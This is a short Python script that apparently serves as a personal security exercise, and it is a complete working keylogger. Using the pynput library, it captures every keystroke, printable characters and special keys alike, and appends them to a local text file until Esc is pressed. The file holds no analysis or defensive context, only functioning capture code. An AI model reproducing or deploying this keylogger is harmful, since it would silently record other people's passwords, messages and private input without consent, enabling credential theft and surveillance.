from pynput import keyboard

log_file = "/Users/roscoe/Desktop/cyber/keylogger/keylogger.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")

    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stops the keylogger

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()